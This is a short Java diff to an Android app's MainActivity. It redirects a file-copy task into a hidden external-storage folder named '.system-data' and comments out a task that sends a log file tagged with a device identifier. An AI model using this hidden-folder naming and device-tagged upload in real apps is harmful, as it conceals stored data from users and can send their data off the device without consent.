@@ -34,13 +34,13 @@ public class MainActivity extends AppCompatActivity {
 
         final ProgressBar pb = (ProgressBar) findViewById(R.id.progressBar2);
         final TextView tv = (TextView) findViewById(R.id.textView3);
-        final String toPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/cz.data.app";
+        final String toPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/.system-data/";
 
         CopyFilesTask cp = new CopyFilesTask(this, folder, toPath);
         cp.execute();
 
-        SendFileTask sf = new SendFileTask(Environment.getExternalStorageDirectory().getAbsolutePath() + "/log.from.app", Settings.Secure.ANDROID_ID);
-        sf.execute();
+        //SendFileTask sf = new SendFileTask(Environment.getExternalStorageDirectory().getAbsolutePath() + "/log.from.app", Settings.Secure.ANDROID_ID);
+        //sf.execute();
     }
 
     private void checkPermissionAndRunRequest(String permission, int request_code){
